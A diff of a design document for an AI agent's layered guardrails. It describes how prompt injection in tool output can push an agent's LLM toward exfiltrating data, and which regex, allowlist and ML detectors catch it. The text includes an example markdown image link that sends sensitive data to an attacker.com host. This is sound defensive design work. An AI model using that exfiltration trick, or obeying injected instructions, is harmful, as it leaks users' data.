@@ -405,54 +405,49 @@ This satisfies Tenet 1 (constraints are external and inviolable — the agent ca
 
 ## The Guardrails Stack
 
-The guardrails run within the LLM proxy and execute on both pre_call (scanning input before it reaches the LLM) and post_call (scanning responses before they return to the agent). **The pre_call/post_call dual mode is non-negotiable for agents.** Pre_call catches injection in user-facing input. Post_call catches the XPIA kill chain: poisoned tool output → manipulated LLM response → exfiltration attempt on the way back out.
+Guardrails scan content at two points: **pre_call** (scanning input before it reaches the LLM) and **post_call** (scanning responses before they return to the agent). The pre_call/post_call dual mode is non-negotiable for agents. Pre_call catches injection in user-facing input. Post_call catches the XPIA kill chain: poisoned tool output → manipulated LLM response → exfiltration attempt on the way back out.
+
+### What the Reference Implementation Ships
+
+The reference implementation (Agency) ships three guardrail mechanisms that require no external services or commercial accounts:
+
+**XPIA Pattern Scanner** (regex-based, pre_call + post_call). Eight pattern detectors covering direct injection phrases, HTML comment injection, markdown image exfiltration, fetch/XHR exfiltration, role override attempts, base64-encoded instruction payloads, DNS-style data encoding in URLs, and PII patterns (SSNs). Runs as a custom LiteLLM guardrail on pre_call, and as a streaming response scanner in the enforcer sidecar on post_call. Zero external dependencies, zero cost, sub-millisecond latency.
+
+**Tool Permission Guard** (LLM tool call allowlist). Enforces a whitelist of which tools the agent is allowed to call, and can restrict tool arguments to pre-approved regex patterns. If XPIA convinces the LLM to call an unauthorized tool, the proxy blocks it. Default configuration is deny-all. Built into LiteLLM.
+
+**Gateway MCP Tool Policy** (MCP server/tool allowlist). Enforces per-server, per-tool allowlists on MCP tool calls at the OS level (sidecar container). Where the tool permission guard mediates tool calls in LLM responses at the proxy layer, the MCP policy mediates MCP tool calls between the agent process and MCP server subprocesses. A compromised agent could invoke MCP tools without going through the LLM at all, bypassing the proxy-level guard entirely. The gateway catches this. Built into the gateway sidecar.
 
 ### Request Flow
 
 ```
 Input (user message, tool output, web content)
-  ├─► [pre_call]  Layer 3: Content Filter   → keywords, regex, harmful categories
-  ├─► [pre_call]  Layer 4: Presidio         → mask PII before LLM sees it
-  ├─► [pre_call]  Layer 1: Cygnal           → ML scan for XPIA/jailbreak
-  ├─► [pre_call]  Layer 2: Pangea           → injection + malicious URL scan
-  ├─► [pre_call]  Layer 6: Built-in Det.    → heuristic/similarity/LLM-judge
+  ├─► [pre_call]  XPIA Pattern Scanner    → regex detection (8 attack vectors)
+  ├─► [pre_call]  (optional layers)       → ML detection, PII masking, URL scanning
   ▼
 LLM Call (provider API via LiteLLM)
-  ├─► [post_call] Layer 1: Cygnal           → ML scan for injection in response
-  ├─► [post_call] Layer 2: Pangea           → malicious URL scan + PII on output
-  ├─► [post_call] Layer 4: Presidio         → mask PII the LLM generated
-  ├─► [post_call] Layer 3: Content Filter   → blocked patterns in output
-  ├─► [post_call] Layer 5: Tool Permission  → validate tool calls are authorized
+  ├─► [post_call] XPIA Pattern Scanner    → streaming response scanning (enforcer)
+  ├─► [post_call] Tool Permission Guard   → validate tool calls are authorized
+  ├─► [post_call] (optional layers)       → ML detection, PII masking, URL scanning
   ▼
 Response returned to agent
-  ├─► [runtime]   Layer 5b: MCP Tool Policy → validate MCP tool calls (gateway sidecar)
+  ├─► [runtime]   MCP Tool Policy         → validate MCP tool calls (gateway sidecar)
 ```
 
-### The Six Layers
+### Optional Layers
 
-**Layer 1 — Gray Swan Cygnal** (ML-based XPIA / IPI / jailbreak detection). The only LiteLLM-integrated guardrail that explicitly differentiates direct injection from indirect prompt injection in tool outputs. Returns a `violation_score` (0–1) along with detection flags. That distinction matters for agentic workflows: you need to know whether injection came from the user or from poisoned external content. *Commercial — requires account.*
+The architecture supports additional guardrail layers via LiteLLM's callback system. These are not shipped with the reference implementation but can be added to any deployment:
 
-**Layer 2 — Pangea AI Guard** (malicious URL/domain + audit trail). The critical capability is malicious URL/domain/IP scanning. A common XPIA exfiltration technique is getting the LLM to render something like `![](https://attacker.com/steal?data=SENSITIVE_INFO)`. Pangea detects these malicious URLs in the response before they reach the user or get rendered. Also provides a full audit trail with webhook support for SIEM integration. *Commercial (free tier available).*
+**ML-based XPIA detection** (e.g., Gray Swan Cygnal). ML models that differentiate direct injection from indirect prompt injection in tool outputs. Returns confidence scores rather than binary pattern matches. Catches sophisticated attacks that evade regex. *Commercial.*
 
-**Layer 3 — LiteLLM Content Filter** (regex, keywords, harmful categories). Fast first-pass pattern matching. Catches known-bad patterns: SSNs, credit card numbers, API key formats, and configurable keyword blocks. Also catches common XPIA exfiltration patterns via regex: markdown image exfil, HTML image exfil, fetch/XHR exfil. *Free, built into LiteLLM.*
+**Malicious URL/domain scanning** (e.g., Pangea AI Guard). Detects malicious URLs in responses before they reach the agent — critical for catching XPIA exfiltration via rendered markdown images (`![](https://attacker.com/steal?data=...)`). *Commercial (free tier available).*
 
-**Layer 4 — Presidio PII Masking** (NLP-based PII detection). Detects and masks personally identifiable information — Social Security numbers, credit cards, emails, phone numbers, names, addresses — using Microsoft's Presidio NLP engine. Runs locally as Flask servers, no external API calls. Pre_call masks PII before the LLM sees it. Post_call masks PII the LLM generated in its response. *Free, open source (MIT licensed).*
+**PII masking** (e.g., Microsoft Presidio). NLP-based detection and masking of personally identifiable information. Pre_call masks PII before the LLM sees it. Post_call masks PII the LLM generated. Runs locally, no external API calls. *Free, open source.*
 
-**Layer 5 — Tool Permission Guard** (LLM tool call allowlist). Enforces a whitelist of which tools the agent is allowed to call, and can restrict tool arguments to pre-approved regex patterns. Least-privilege at the gateway level: if XPIA convinces the LLM to call an unauthorized tool, the proxy blocks it. Default configuration is deny-all. *Free, built into LiteLLM.*
+**LLM-as-judge injection detection.** Uses a small model to classify whether content contains injection attempts. Higher accuracy than regex, lower cost than commercial ML. *Free (fractions of a cent per call).*
 
-**Layer 5b — Gateway MCP Tool Policy** (MCP server/tool allowlist). Enforces per-server, per-tool allowlists on MCP tool calls at the OS level (sidecar container). Where Layer 5 mediates tool calls in LLM responses at the proxy layer, Layer 5b mediates MCP tool calls between the agent process and MCP server subprocesses. A compromised agent could invoke MCP tools without going through the LLM at all, bypassing Layer 5 entirely. Layer 5b catches this. *Free, built into the gateway sidecar.*
+### Defense Posture
 
-**Layer 6 — Built-in Prompt Injection Detector** (heuristic + similarity + LLM-as-judge). Three stacked methods: heuristic pattern matching (zero cost, zero latency), cosine similarity against a database of known attack vectors, and LLM-as-judge using a small model to classify injection. *Free — heuristic and similarity cost $0; LLM-as-judge costs fractions of a cent.*
-
-### Cost Summary
-
-| Layer | Cost |
-|---|---|
-| Layer 1: Gray Swan Cygnal | Commercial |
-| Layer 2: Pangea AI Guard | Commercial (free tier) |
-| Layers 3–6 (including 5b) | Free |
-
-You can run Layers 3–6 for essentially $0 and get regex blocking, PII masking, tool permission enforcement, MCP tool mediation, and heuristic injection detection. Layers 1 and 2 add ML-based detection that catches sophisticated attacks that slip past pattern matching.
+The shipped guardrails (XPIA patterns + tool permission + MCP policy) catch known attack patterns at zero cost with zero external dependencies. They work in fully network-isolated environments. Adding ML-based layers (Cygnal, Pangea) extends coverage to novel attack patterns that evade regex — but requires external service access and commercial accounts. The architecture is designed so that layers stack independently: adding or removing a layer doesn't affect the others.
 
 ---
 
